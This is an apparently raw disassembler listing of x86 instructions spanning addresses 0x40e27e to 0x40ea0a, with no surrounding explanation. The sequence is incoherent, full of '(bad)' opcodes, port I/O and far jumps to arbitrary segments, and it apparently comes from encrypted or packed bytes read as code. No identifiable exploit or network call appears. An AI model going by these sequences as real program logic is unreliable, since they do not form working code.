  40e27e:	mov    BYTE PTR [ebx-0x7a],ah
  40e281:	out    0x82,al
  40e283:	pushf  
  40e284:	jg     0x40e27f
  40e286:	gs jno 0x40e2da
  40e289:	push   ds
  40e28a:	mov    cl,0x61
  40e28c:	cmp    BYTE PTR [edi-0x21f1e814],ah
  40e292:	push   0x160dd647
  40e297:	punpckhbw mm6,QWORD PTR [edi+0x3a]
  40e29b:	cmc    
  40e29c:	pop    ebp
  40e29d:	ja     0x40e2a6
  40e29f:	and    DWORD PTR [edx+0x71],eax
  40e2a2:	(bad)  
  40e2a3:	out    dx,eax
  40e2a4:	jno    0x40e316
  40e2a6:	inc    esp
  40e2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2a8:	cmc    
  40e2a9:	popf   
  40e2aa:	xor    DWORD PTR [eax+0x49af4d87],ebx
  40e2b0:	jo     0x40e236
  40e2b2:	loopne 0x40e275
  40e2b4:	nop
  40e2b5:	stc    
  40e2b6:	add    BYTE PTR [edi],cl
  40e2b8:	aas    
  40e2b9:	lahf   
  40e2ba:	push   es
  40e2bb:	int3   
  40e2bc:	push   0x18
  40e2be:	addr16 daa 
  40e2c0:	lock mov eax,0x9aab7103
  40e2c6:	mov    ds:0x8b134893,al
  40e2cb:	add    al,0x96
  40e2cd:	rcl    DWORD PTR [ebx-0x466da197],0xf
  40e2d4:	cwde   
  40e2d5:	xor    bl,BYTE PTR [ebp-0x66a3bed5]
  40e2db:	dec    ecx
  40e2dc:	add    al,al
  40e2de:	jns    0x40e324
  40e2e0:	add    esi,ebx
  40e2e2:	sbb    BYTE PTR [edx+0xe],bh
  40e2e5:	ds mov al,0x5f
  40e2e8:	jne    0x40e277
  40e2ea:	lds    eax,FWORD PTR [ebx-0x4f]
  40e2ed:	push   edx
  40e2ee:	push   0xae69e484
  40e2f3:	mov    dl,0xa1
  40e2f5:	add    DWORD PTR [edi-0x55],edx
  40e2f8:	adc    edx,DWORD PTR [esi+0x75]
  40e2fb:	add    eax,0x4953299a
  40e300:	jecxz  0x40e292
  40e302:	jg     0x40e372
  40e304:	stc    
  40e305:	dec    esp
  40e306:	push   0x1bee6aaa
  40e30b:	dec    ecx
  40e30c:	and    eax,DWORD PTR [edx+0x20]
  40e30f:	stos   DWORD PTR es:[edi],eax
  40e310:	jns    0x40e33a
  40e312:	or     BYTE PTR [edi-0x723655f0],ch
  40e318:	je     0x40e2d5
  40e31a:	or     ecx,esp
  40e31c:	inc    edx
  40e31d:	gs addr16 mov ch,0xb
  40e321:	daa    
  40e322:	dec    eax
  40e323:	mov    BYTE PTR [esp+esi*4],dl
  40e326:	adc    DWORD PTR [esi],esi
  40e328:	arpl   WORD PTR [eax-0x74],di
  40e32b:	ja     0x40e2dd
  40e32d:	ins    DWORD PTR es:[edi],dx
  40e32e:	call   0xff1c5253
  40e333:	mov    eax,DWORD PTR [edx+0x7a]
  40e336:	rol    DWORD PTR [esp+eax*2+0x31db83b],1
  40e33d:	test   DWORD PTR [ebx-0x6c33c217],ecx
  40e343:	aam    0x82
  40e345:	dec    esi
  40e346:	adc    DWORD PTR [eax+0x40],edx
  40e349:	test   al,0x2
  40e34b:	rol    esp,1
  40e34d:	push   esp
  40e34e:	inc    eax
  40e34f:	data16 fdivr st(2),st
  40e352:	or     BYTE PTR [edx],0xaf
  40e355:	cwde   
  40e356:	aas    
  40e357:	xor    al,0x2e
  40e359:	jnp    0x40e337
  40e35b:	shl    DWORD PTR [ecx-0x55],1
  40e35e:	cmp    ecx,esi
  40e360:	sub    al,0x8e
  40e362:	pusha  
  40e363:	fisttp QWORD PTR [edx-0x6a63da1d]
  40e369:	jle    0x40e3e6
  40e36b:	mov    ah,dh
  40e36d:	out    dx,eax
  40e36e:	(bad)  
  40e36f:	std    
  40e370:	cmp    eax,0x563d3805
  40e375:	call   0x5a7:0x7a8cef87
  40e37c:	(bad)  
  40e37d:	jl     0x40e3a4
  40e37f:	shl    BYTE PTR [ebx],1
  40e381:	jecxz  0x40e304
  40e383:	pop    ebp
  40e384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e385:	test   eax,0xcf7fe390
  40e38a:	(bad)  
  40e38b:	stos   DWORD PTR es:[edi],eax
  40e38c:	push   edx
  40e38d:	add    BYTE PTR [edx-0x71],bl
  40e390:	push   cs
  40e391:	fbstp  TBYTE PTR [ebx-0x74]
  40e394:	jae    0x40e409
  40e396:	or     DWORD PTR [eax+0x4d0907cc],ebp
  40e39c:	aaa    
  40e39d:	push   ds
  40e39e:	imul   esp,edi,0x6c359fea
  40e3a4:	adc    al,0x48
  40e3a6:	bound  ecx,QWORD PTR [edx+0x3b73d202]
  40e3ac:	or     al,0x65
  40e3ae:	sti    
  40e3af:	dec    ebx
  40e3b0:	mov    ebx,0xe9241686
  40e3b5:	daa    
  40e3b6:	cmp    eax,0xded78d15
  40e3bb:	inc    eax
  40e3bc:	repz push esi
  40e3be:	xor    dl,BYTE PTR [edx+0xa]
  40e3c1:	les    ecx,FWORD PTR [edi-0x77]
  40e3c4:	lea    ecx,[esi+0x5e392e47]
  40e3ca:	sbb    BYTE PTR [edx],cl
  40e3cc:	loop   0x40e3f6
  40e3ce:	aam    0x61
  40e3d0:	pop    ecx
  40e3d1:	dec    edi
  40e3d2:	in     al,dx
  40e3d3:	adc    eax,0x5b08c920
  40e3d8:	cmp    ebp,DWORD PTR [edx+0x4c]
  40e3db:	inc    ecx
  40e3dc:	dec    edx
  40e3dd:	adc    al,0x63
  40e3df:	fsub   st,st(5)
  40e3e1:	jnp    0x40e367
  40e3e3:	or     DWORD PTR [edx],ebx
  40e3e5:	mov    ecx,0x8fe7fa48
  40e3ea:	mov    edi,0xa4face99
  40e3ef:	jae    0x40e3d5
  40e3f1:	aaa    
  40e3f2:	scas   al,BYTE PTR es:[edi]
  40e3f3:	xchg   esi,eax
  40e3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f5:	not    BYTE PTR ds:[esp]
  40e3f9:	ror    DWORD PTR [eax-0x4f0697e8],0x3b
  40e400:	rcr    DWORD PTR [ecx+ecx*4-0xe],0xd8
  40e405:	sar    DWORD PTR [edi-0x545a4792],1
  40e40b:	xlat   BYTE PTR ds:[ebx]
  40e40c:	adc    bh,ah
  40e40e:	pop    edi
  40e40f:	cmp    eax,0x9a6f2972
  40e414:	dec    DWORD PTR [eax-0x29a2d618]
  40e41a:	fsub   QWORD PTR [ebp-0x72]
  40e41d:	and    BYTE PTR [edi-0x43],ah
  40e420:	ins    DWORD PTR es:[edi],dx
  40e421:	rcl    BYTE PTR [eax],1
  40e423:	dec    ebx
  40e424:	xchg   esi,eax
  40e425:	add    BYTE PTR [ebx-0x57],ah
  40e428:	cmc    
  40e429:	jp     0x40e42f
  40e42b:	popa   
  40e42c:	outs   dx,DWORD PTR ds:[esi]
  40e42d:	ficom  WORD PTR [eax+0x40]
  40e430:	mov    ds:0x14c7a408,eax
  40e435:	push   DWORD PTR [edi+0x57426b97]
  40e43b:	pop    ss
  40e43c:	imul   DWORD PTR [ebx+edi*2+0x57]
  40e440:	mov    ebx,0xb02b04e7
  40e445:	jmp    0xfb74:0xa6ccb2e5
  40e44c:	in     al,dx
  40e44d:	ret    0x9931
  40e450:	inc    ebp
  40e451:	bnd call 0xec99a21b
  40e457:	push   0xffffffc7
  40e459:	xchg   bl,ah
  40e45b:	aam    0xcc
  40e45d:	or     eax,0xbabef130
  40e462:	pop    ds
  40e463:	fwait
  40e464:	or     al,0x8a
  40e466:	retf   0x1fc9
  40e469:	sub    BYTE PTR [ebp-0xf1dc552],al
  40e46f:	pop    ecx
  40e470:	loopne 0x40e4ca
  40e472:	fcmove st,st(0)
  40e474:	stos   DWORD PTR es:[edi],eax
  40e475:	lods   eax,DWORD PTR ds:[esi]
  40e476:	test   DWORD PTR ss:[ebx-0x73],ebx
  40e47a:	inc    ebx
  40e47b:	fwait
  40e47c:	add    BYTE PTR [eax+0x686efd4c],dl
  40e482:	ret    
  40e483:	mov    DWORD PTR [edx-0x6cd57dd8],edx
  40e489:	cs adc BYTE PTR cs:[ecx],bh
  40e48d:	retf   0x3adc
  40e490:	data16 jge 0x40e4c3
  40e493:	sub    al,0x8f
  40e495:	sub    ebp,DWORD PTR [edx]
  40e497:	mov    esp,0xfe0066e8
  40e49c:	dec    ebp
  40e49d:	push   edx
  40e49e:	fild   QWORD PTR [edx-0x58]
  40e4a1:	push   esi
  40e4a2:	inc    ebx
  40e4a3:	pop    eax
  40e4a4:	int3   
  40e4a5:	xor    dh,ch
  40e4a7:	out    dx,al
  40e4a8:	leave  
  40e4a9:	push   edx
  40e4aa:	mul    DWORD PTR [ecx+0x611d31dc]
  40e4b0:	loop   0x40e474
  40e4b2:	retf   
  40e4b3:	mov    ecx,0x9e1cf2d0
  40e4b8:	stos   DWORD PTR es:[edi],eax
  40e4b9:	into   
  40e4ba:	pushf  
  40e4bb:	(bad)  
  40e4bc:	pop    edx
  40e4bd:	ja     0x40e49a
  40e4bf:	add    al,0x50
  40e4c1:	sub    eax,0xa250f1f0
  40e4c6:	retf   
  40e4c7:	ins    DWORD PTR es:[edi],dx
  40e4c8:	adc    DWORD PTR [edi+0xb],0x6b
  40e4cc:	addr16 lahf 
  40e4ce:	bound  ebp,QWORD PTR [edi-0x2d59df63]
  40e4d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4d5:	inc    eax
  40e4d6:	aas    
  40e4d7:	xor    ebp,DWORD PTR [eax+0x42f683c7]
  40e4dd:	sub    al,0xbc
  40e4df:	mov    dl,0x55
  40e4e1:	arpl   WORD PTR [eax],si
  40e4e3:	mov    DWORD PTR [ecx],ebp
  40e4e5:	xor    al,0xf5
  40e4e7:	mov    eax,ds:0x602e3e4f
  40e4ec:	sub    eax,0x51ac0049
  40e4f1:	or     al,0x40
  40e4f3:	fstp   TBYTE PTR [eax+0x55485ac1]
  40e4f9:	mov    WORD PTR [esi-0x74618430],fs
  40e4ff:	xor    eax,0x79f8f283
  40e504:	mov    bh,0x39
  40e506:	cmp    ecx,edx
  40e508:	push   ebx
  40e509:	pusha  
  40e50a:	jns    0x40e515
  40e50c:	sub    DWORD PTR gs:[ebx],0x62
  40e510:	js     0x40e538
  40e512:	and    al,0x42
  40e514:	lahf   
  40e515:	icebp  
  40e516:	mov    DWORD PTR [ebx+0x13],0x66c0d288
  40e51d:	daa    
  40e51e:	add    eax,0x682f6b6c
  40e523:	stos   BYTE PTR es:[edi],al
  40e524:	cld    
  40e525:	data16 jne 0x40e551
  40e528:	mov    ds:0xeafb26bb,eax
  40e52d:	mov    dl,0xb4
  40e52f:	gs and ah,ch
  40e532:	stos   BYTE PTR es:[edi],al
  40e533:	jbe    0x40e5a3
  40e535:	pop    esi
  40e536:	outs   dx,DWORD PTR ds:[esi]
  40e537:	sub    ebp,DWORD PTR [esi-0x31]
  40e53a:	daa    
  40e53b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e53c:	pop    esi
  40e53d:	test   eax,0x1d1898cf
  40e542:	add    al,0x5c
  40e544:	dec    eax
  40e545:	sub    ah,bl
  40e547:	and    eax,0x5115241f
  40e54c:	mov    ebx,0xec5a9808
  40e551:	cmp    ecx,ebx
  40e553:	and    dl,al
  40e555:	fisub  DWORD PTR [eax]
  40e557:	inc    edi
  40e558:	fidivr WORD PTR [esi]
  40e55a:	xchg   ebx,eax
  40e55b:	adc    BYTE PTR [edi],cl
  40e55d:	call   0xb14a:0x95250cfa
  40e564:	or     al,0x47
  40e566:	ins    BYTE PTR es:[edi],dx
  40e567:	fwait
  40e568:	into   
  40e569:	mov    ecx,0xc2b8bd2f
  40e56e:	shl    edx,cl
  40e570:	in     al,0x31
  40e572:	sbb    dh,cl
  40e574:	fwait
  40e575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e576:	(bad)  
  40e577:	push   ds
  40e578:	rcr    BYTE PTR [ecx+0x40],0x46
  40e57c:	test   DWORD PTR [esi-0x16250ae],0xcaa22a20
  40e586:	ret    0xb444
  40e589:	add    al,0xe6
  40e58b:	enter  0x78cc,0xdc
  40e58f:	sub    ebx,DWORD PTR [edx-0x7870ec07]
  40e595:	inc    ebx
  40e596:	out    dx,al
  40e597:	cmp    DWORD PTR [edx+0x15ae716a],ebp
  40e59d:	inc    edi
  40e59e:	push   ecx
  40e59f:	xchg   eax,ebx
  40e5a1:	xchg   edx,eax
  40e5a2:	pop    es
  40e5a3:	fist   DWORD PTR ds:0xe2b1356f
  40e5a9:	add    esp,DWORD PTR [ecx-0x56]
  40e5ac:	arpl   WORD PTR [ebp-0x1a0ae9c5],bp
  40e5b2:	daa    
  40e5b3:	icebp  
  40e5b4:	retf   0xf639
  40e5b7:	sub    dl,BYTE PTR [ebp+0x6b2aa5ee]
  40e5bd:	fcmove st,st(1)
  40e5bf:	fwait
  40e5c0:	mov    cl,BYTE PTR [edi+0x5afeef9e]
  40e5c6:	or     edi,DWORD PTR [eax]
  40e5c8:	jp     0x40e5bb
  40e5ca:	ins    BYTE PTR es:[edi],dx
  40e5cb:	hlt    
  40e5cc:	mov    edi,0x2be611ec
  40e5d1:	adc    eax,DWORD PTR [edx*8-0x4516cba0]
  40e5d8:	fdiv   st,st(3)
  40e5da:	div    DWORD PTR [eax-0x1d7d0d4d]
  40e5e0:	pop    edx
  40e5e1:	lods   eax,DWORD PTR ds:[esi]
  40e5e2:	add    ah,BYTE PTR [edi]
  40e5e4:	mov    ecx,0xcf9fbe6
  40e5e9:	push   bx
  40e5eb:	sbb    DWORD PTR [ebx-0x26],edx
  40e5ee:	cmp    eax,0x4da72294
  40e5f3:	xor    al,0x2a
  40e5f5:	dec    edx
  40e5f6:	and    esi,DWORD PTR ds:0xd3279704
  40e5fc:	aad    0x18
  40e5fe:	mov    bh,0x9
  40e600:	xor    cl,BYTE PTR [edi-0x3affb863]
  40e606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e607:	pop    edi
  40e608:	push   ds
  40e609:	call   0xfa4560ff
  40e60e:	es jns 0x40e66b
  40e611:	out    0xa9,al
  40e613:	or     ch,0x6c
  40e616:	test   eax,0xe4b0b4f5
  40e61b:	sub    ch,BYTE PTR [ebp+0x79fe1f21]
  40e621:	dec    esi
  40e622:	test   BYTE PTR [ecx+ecx*2-0x4457072b],bl
  40e629:	fcomp  QWORD PTR [ecx]
  40e62b:	sbb    DWORD PTR [edx-0x71aa87c4],0x6bd7cfc5
  40e635:	out    dx,al
  40e636:	mov    esp,0x86db205a
  40e63b:	scas   eax,DWORD PTR es:[edi]
  40e63c:	nop
  40e63d:	in     al,0xff
  40e63f:	pop    ebx
  40e640:	dec    esi
  40e641:	popf   
  40e642:	mov    ch,0x70
  40e644:	pushf  
  40e645:	(bad)  
  40e646:	mov    al,0x79
  40e648:	imul   edi,DWORD PTR [edx-0x18c97096],0xcaac7e33
  40e652:	jo     0x40e6b5
  40e654:	pop    edx
  40e655:	cli    
  40e656:	adc    BYTE PTR [ebx+0x14],ch
  40e659:	cli    
  40e65a:	jmp    0x21da6566
  40e65f:	mov    ch,0x59
  40e661:	mov    edi,0x36961f74
  40e666:	dec    ebp
  40e667:	scas   eax,DWORD PTR es:[edi]
  40e668:	aam    0x55
  40e66a:	mov    esi,0x55ae5a75
  40e66f:	jo     0x40e60a
  40e671:	jmp    0x40e608
  40e673:	lahf   
  40e674:	sub    al,0x81
  40e676:	ror    esp,1
  40e678:	jno    0x40e6cb
  40e67a:	push   eax
  40e67b:	jbe    0x40e6ea
  40e67d:	iret   
  40e67e:	mov    es:0x548ee2df,al
  40e684:	xor    al,dl
  40e686:	jp     0x40e625
  40e688:	lahf   
  40e689:	pop    es
  40e68a:	mov    edx,0xd44c2495
  40e68f:	mov    bl,0x92
  40e691:	jne    0x40e6a5
  40e693:	(bad)  [ebx-0xcf523ae]
  40e699:	add    al,0xd9
  40e69b:	test   al,0x2e
  40e69d:	mov    dh,0xee
  40e69f:	ds push edx
  40e6a1:	retf   
  40e6a2:	dec    ecx
  40e6a3:	ins    BYTE PTR es:[edi],dx
  40e6a4:	ss sub cl,al
  40e6a7:	mov    eax,ds:0x93c53191
  40e6ac:	ins    BYTE PTR es:[edi],dx
  40e6ad:	(bad)  
  40e6ae:	in     eax,0xbd
  40e6b0:	pop    ecx
  40e6b1:	cmp    ebx,ebp
  40e6b3:	icebp  
  40e6b4:	loopne 0x40e6ca
  40e6b6:	gs dec edx
  40e6b8:	cmp    BYTE PTR [eax+eiz*1-0x40cd055e],dl
  40e6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6c0:	mov    ds:0x886def7e,eax
  40e6c5:	or     eax,0x43a290af
  40e6ca:	aad    0xca
  40e6cc:	sar    DWORD PTR [edx],0x65
  40e6cf:	getsec 
  40e6d1:	jne    0x40e6ad
  40e6d3:	xchg   ebp,eax
  40e6d4:	sbb    DWORD PTR [ebx],ebx
  40e6d6:	or     al,0xe1
  40e6d8:	jbe    0x40e719
  40e6da:	jno    0x40e6ff
  40e6dc:	(bad)  
  40e6dd:	push   edi
  40e6de:	xchg   DWORD PTR [edi-0x45],ebp
  40e6e1:	push   es
  40e6e2:	not    eax
  40e6e4:	int3   
  40e6e5:	pop    esi
  40e6e6:	fnstenv [eax]
  40e6e8:	ins    BYTE PTR es:[edi],dx
  40e6e9:	dec    eax
  40e6ea:	leave  
  40e6eb:	jle    0x40e6d2
  40e6ed:	mov    ch,0xd9
  40e6ef:	mov    ah,0xdc
  40e6f1:	cmp    al,BYTE PTR [edi-0x620ba49f]
  40e6f7:	dec    edx
  40e6f8:	dec    esp
  40e6f9:	xor    esp,edx
  40e6fb:	lahf   
  40e6fc:	jmp    0xe8d7666e
  40e701:	push   esi
  40e702:	mov    cl,0x29
  40e704:	mov    al,ds:0x547333c9
  40e709:	xchg   edx,eax
  40e70a:	outs   dx,DWORD PTR ds:[esi]
  40e70b:	xchg   ecx,eax
  40e70c:	inc    ecx
  40e70d:	call   0xbeca:0x3dbd5d62
  40e714:	test   BYTE PTR [esi-0x1fb781d3],al
  40e71a:	mov    edx,0x9d8ddf71
  40e71f:	rcl    DWORD PTR [edx-0x48160b44],0xe8
  40e726:	jl     0x40e75d
  40e728:	repz adc BYTE PTR [ebp-0x6858617c],0x4c
  40e730:	mov    bh,0x68
  40e732:	pop    ds
  40e733:	fisttp QWORD PTR [ecx]
  40e735:	push   edx
  40e736:	and    eax,0x63a2c9b8
  40e73b:	jno    0x40e75e
  40e73d:	call   0x9c9f:0x57e44c6b
  40e744:	loop   0x40e74b
  40e746:	test   al,0x8f
  40e748:	inc    ebp
  40e749:	daa    
  40e74a:	aaa    
  40e74b:	and    edi,DWORD PTR [edx+0x5773712d]
  40e751:	mov    DWORD PTR [edx+0x343c50d9],0xc117c5e0
  40e75b:	rol    DWORD PTR [eax],0x3
  40e75e:	or     eax,0xb395c763
  40e763:	adc    BYTE PTR ds:0x3f103a1b,bl
  40e769:	and    esp,ebx
  40e76b:	gs mov bl,0xc9
  40e76e:	mov    gs,WORD PTR [edx+0x1a9637d4]
  40e774:	sbb    dh,BYTE PTR [edi+0x43c166f2]
  40e77a:	pop    DWORD PTR [ebx-0x1c088932]
  40e780:	outs   dx,BYTE PTR ds:[esi]
  40e781:	xchg   edx,eax
  40e782:	xchg   esi,eax
  40e783:	jns    0x40e729
  40e785:	and    BYTE PTR [esp+eax*2],cl
  40e788:	icebp  
  40e789:	cdq    
  40e78a:	(bad)  
  40e78b:	loop   0x40e746
  40e78d:	(bad)  
  40e78e:	push   ecx
  40e78f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e790:	mov    bl,0x57
  40e792:	xor    ch,BYTE PTR [esi]
  40e794:	aas    
  40e795:	pop    ebp
  40e796:	dec    esp
  40e797:	enter  0xf115,0x73
  40e79b:	pop    ebx
  40e79c:	ja     0x40e776
  40e79e:	and    eax,0xa4b4299f
  40e7a3:	xor    DWORD PTR [esi+0x5b2b7040],edi
  40e7a9:	mov    edx,0xaadc88b0
  40e7ae:	daa    
  40e7af:	inc    esi
  40e7b0:	jo     0x40e73d
  40e7b2:	or     eax,edi
  40e7b4:	adc    ch,ch
  40e7b6:	popf   
  40e7b7:	out    dx,al
  40e7b8:	xchg   ecx,eax
  40e7b9:	jo     0x40e7f2
  40e7bb:	mov    ah,0xf9
  40e7bd:	mov    eax,0x3980d5ae
  40e7c2:	scas   eax,DWORD PTR es:[edi]
  40e7c3:	rol    DWORD PTR [edi+0x69],1
  40e7c6:	outs   dx,BYTE PTR ds:[esi]
  40e7c7:	(bad)  
  40e7c8:	push   0x5a
  40e7ca:	push   esi
  40e7cb:	dec    edx
  40e7cc:	jb     0x40e800
  40e7ce:	aaa    
  40e7cf:	jns    0x40e7a1
  40e7d1:	mov    eax,ds:0x18e8e605
  40e7d6:	add    bh,BYTE PTR [esi-0x797ea12]
  40e7dc:	ja     0x40e7fe
  40e7de:	add    ebp,0x2da8ea32
  40e7e4:	cdq    
  40e7e5:	mov    edi,0x40ccaf35
  40e7ea:	cmp    ch,BYTE PTR [edx]
  40e7ec:	fist   WORD PTR [edi]
  40e7ee:	aas    
  40e7ef:	aad    0x6b
  40e7f1:	pop    esp
  40e7f2:	mov    ecx,0x856bde0b
  40e7f7:	adc    bh,BYTE PTR [edi]
  40e7f9:	je     0x40e870
  40e7fb:	sub    al,BYTE PTR [esi+edi*8]
  40e7fe:	out    0x54,al
  40e800:	mov    ebx,0x5b695975
  40e805:	and    eax,0x1665c56d
  40e80a:	ror    BYTE PTR [esi-0x70],cl
  40e80d:	dec    ebp
  40e80e:	sub    al,0xb
  40e810:	int    0x18
  40e812:	dec    esp
  40e813:	in     al,0x44
  40e815:	pop    ss
  40e816:	out    dx,al
  40e817:	imul   ecx,DWORD PTR [ecx-0x51],0xe469bd35
  40e81e:	loope  0x40e86f
  40e820:	out    0x2a,al
  40e822:	std    
  40e823:	cmp    esi,0x329bdf4e
  40e829:	test   eax,0xac16af2d
  40e82e:	push   ds
  40e82f:	hlt    
  40e830:	out    0xd5,al
  40e832:	push   edi
  40e833:	fsub   DWORD PTR [esi+ecx*2]
  40e836:	lods   al,BYTE PTR ds:[esi]
  40e837:	int3   
  40e838:	stos   DWORD PTR es:[edi],eax
  40e839:	push   0xffffff87
  40e83b:	gs ret 0x9b94
  40e83f:	ins    DWORD PTR es:[edi],dx
  40e840:	(bad)  
  40e841:	pusha  
  40e842:	dec    ebp
  40e843:	cwde   
  40e844:	mov    ds:0x54e55ffb,al
  40e849:	(bad)  
  40e84a:	xor    eax,0x6f46e383
  40e84f:	cmp    eax,0x47c5835
  40e854:	(bad)
  40e857:	add    al,0xe9
  40e859:	add    eax,0x86cc2786
  40e85e:	shl    BYTE PTR [esi-0x62dc32f5],1
  40e864:	cmp    bl,0x5d
  40e867:	lea    ecx,[esi+0x7dbfea6c]
  40e86d:	(bad)  
  40e86e:	aaa    
  40e86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e870:	fst    QWORD PTR [ecx-0x222eae5c]
  40e876:	mov    BYTE PTR [ebp-0x6a],dh
  40e879:	jnp    0x40e8a9
  40e87b:	inc    ecx
  40e87c:	pushf  
  40e87d:	test   al,0xad
  40e87f:	in     al,0xf
  40e881:	jb     0x40e82e
  40e883:	xor    al,0xb
  40e885:	jecxz  0x40e854
  40e887:	xor    ecx,esi
  40e889:	push   ds
  40e88a:	push   eax
  40e88b:	pushf  
  40e88c:	or     bl,BYTE PTR [edx+0x4]
  40e88f:	pop    edx
  40e890:	loope  0x40e81d
  40e892:	jp     0x40e857
  40e894:	lods   al,BYTE PTR ds:[esi]
  40e895:	adc    al,0xb7
  40e897:	or     DWORD PTR [edi],edx
  40e899:	js     0x40e829
  40e89b:	jno    0x40e849
  40e89d:	jg     0x40e896
  40e89f:	cmp    eax,0x680ae863
  40e8a4:	pop    ds
  40e8a5:	push   ss
  40e8a6:	sbb    eax,0x1d63d5be
  40e8ab:	pop    edi
  40e8ac:	in     eax,dx
  40e8ad:	xchg   al,ch
  40e8af:	adc    DWORD PTR [eax],esi
  40e8b1:	pusha  
  40e8b2:	push   es
  40e8b3:	les    edi,FWORD PTR ds:0xdb9bec8f
  40e8b9:	shr    DWORD PTR [esp+edi*8],1
  40e8bc:	and    al,0x8e
  40e8be:	fwait
  40e8bf:	mov    ch,BYTE PTR [ebp-0x8d97c66]
  40e8c5:	xchg   BYTE PTR [ecx],dl
  40e8c7:	mov    ah,0xd0
  40e8c9:	push   cs
  40e8ca:	dec    edx
  40e8cb:	xchg   ebp,eax
  40e8cc:	sub    BYTE PTR [ebp-0x6b583f72],dh
  40e8d2:	or     esp,DWORD PTR [edi]
  40e8d4:	xor    BYTE PTR [ebx],0xb3
  40e8d7:	es cli 
  40e8d9:	or     DWORD PTR [esi],0x29ce0035
  40e8df:	loope  0x40e923
  40e8e1:	dec    eax
  40e8e2:	dec    edi
  40e8e3:	sub    DWORD PTR [ebp+eiz*8+0x5c],ecx
  40e8e7:	push   ds
  40e8e8:	sar    DWORD PTR [esi-0x6f],1
  40e8eb:	or     bh,BYTE PTR [ecx+0x23]
  40e8ee:	cmp    dl,BYTE PTR [eax+0x59]
  40e8f1:	sbb    bh,al
  40e8f3:	loop   0x40e90b
  40e8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8f6:	jge    0x40e8b0
  40e8f8:	lods   eax,DWORD PTR ds:[esi]
  40e8f9:	jg     0x40e939
  40e8fb:	imul   ebp,DWORD PTR [eax],0xfffffff3
  40e8fe:	lods   al,BYTE PTR ds:[esi]
  40e8ff:	rol    DWORD PTR [edx-0x6b],0xc
  40e903:	scas   al,BYTE PTR es:[edi]
  40e904:	xor    BYTE PTR [ebx+edi*1-0x3ff8b098],0x51
  40e90c:	inc    edx
  40e90d:	mov    al,0x9a
  40e90f:	fstp   DWORD PTR cs:[ecx+ecx*4-0x9]
  40e914:	or     cl,dh
  40e916:	retf   0x7182
  40e919:	loope  0x40e92e
  40e91b:	pop    ebp
  40e91c:	pop    edi
  40e91d:	outs   dx,DWORD PTR ds:[esi]
  40e91e:	jb     0x40e8db
  40e920:	fwait
  40e921:	test   cl,0xf6
  40e924:	test   al,cl
  40e926:	cmp    edi,ebp
  40e928:	pop    esp
  40e929:	sub    eax,0x79595c23
  40e92e:	fmul   QWORD PTR [edi+ecx*2-0x23]
  40e932:	xchg   esp,eax
  40e933:	and    al,0x33
  40e935:	sub    al,0x72
  40e937:	jbe    0x40e923
  40e939:	push   esp
  40e93a:	push   esi
  40e93b:	jmp    0x834a:0xe32a6c5f
  40e942:	mov    BYTE PTR [edi+0x72b7722b],al
  40e948:	push   ecx
  40e949:	lahf   
  40e94a:	adc    BYTE PTR [eax+edx*1-0x1f],cl
  40e94e:	inc    ecx
  40e94f:	dec    ecx
  40e950:	jae    0x40e9ca
  40e952:	jo     0x40e988
  40e954:	gs push cs
  40e956:	jg     0x40e8e9
  40e958:	inc    ebp
  40e959:	lock add al,0xb8
  40e95c:	mov    edx,0x8b7290af
  40e961:	xor    eax,edx
  40e963:	mov    edx,0xaa862605
  40e968:	xor    edi,DWORD PTR [edx+0x63ac4632]
  40e96e:	fdiv   QWORD PTR [eax]
  40e970:	lahf   
  40e971:	jmp    0x768c81eb
  40e976:	dec    ebp
  40e977:	xchg   DWORD PTR [esi-0x7d],edx
  40e97a:	pop    ebp
  40e97b:	adc    BYTE PTR [ecx+edi*1],dh
  40e97e:	loope  0x40e980
  40e980:	mov    edx,0x9d02da30
  40e985:	fnstenv [edx+0x61071592]
  40e98b:	ja     0x40e9bf
  40e98d:	iret   
  40e98e:	and    al,0xdb
  40e990:	jl     0x40e974
  40e992:	add    al,0x52
  40e994:	stos   DWORD PTR es:[edi],eax
  40e995:	mov    dl,0xba
  40e997:	and    eax,0xc1be57aa
  40e99c:	dec    ebx
  40e99d:	add    eax,0x22354f43
  40e9a2:	call   0x71b3:0x7d99bae9
  40e9a9:	adc    ebx,edi
  40e9ab:	imul   eax,DWORD PTR [esi+0x29],0x178b41df
  40e9b2:	aas    
  40e9b3:	pop    edi
  40e9b4:	push   ecx
  40e9b5:	imul   esi,DWORD PTR [ecx-0x32],0x54293d4c
  40e9bc:	and    ebx,DWORD PTR [edi-0x457381b0]
  40e9c2:	scas   al,BYTE PTR es:[edi]
  40e9c3:	xchg   ebx,eax
  40e9c4:	mov    dl,0xdc
  40e9c6:	push   esi
  40e9c7:	xor    esi,ecx
  40e9c9:	mov    gs,WORD PTR [ebx+0xb]
  40e9cc:	popa   
  40e9cd:	jae    0x40e982
  40e9cf:	inc    ecx
  40e9d0:	adc    ebp,DWORD PTR [esi]
  40e9d2:	sub    edi,DWORD PTR [edi]
  40e9d4:	cmp    eax,DWORD PTR [ebx-0x46]
  40e9d7:	scas   al,BYTE PTR es:[edi]
  40e9d8:	xor    eax,0x8b6132c7
  40e9dd:	sar    al,0x40
  40e9e0:	out    dx,eax
  40e9e1:	mul    DWORD PTR [edi+0x4449a3c3]
  40e9e7:	mov    esi,DWORD PTR [ebx+0x31bae088]
  40e9ed:	stos   DWORD PTR es:[edi],eax
  40e9ee:	sub    al,dh
  40e9f0:	sar    BYTE PTR [edi+0x443ecf47],1
  40e9f6:	inc    edi
  40e9f7:	mov    WORD PTR [edx],?
  40e9f9:	push   ss
  40e9fa:	jge    0x40ea08
  40e9fc:	sub    edx,DWORD PTR [esp+esi*8-0x6a]
  40ea00:	inc    edx
  40ea01:	fs xchg ecx,eax
  40ea03:	nop
  40ea04:	or     ebp,DWORD PTR [edx-0x1b6691f2]
  40ea0a:	sbb    BYTE PTR [ebp-0x4be374bd],dh
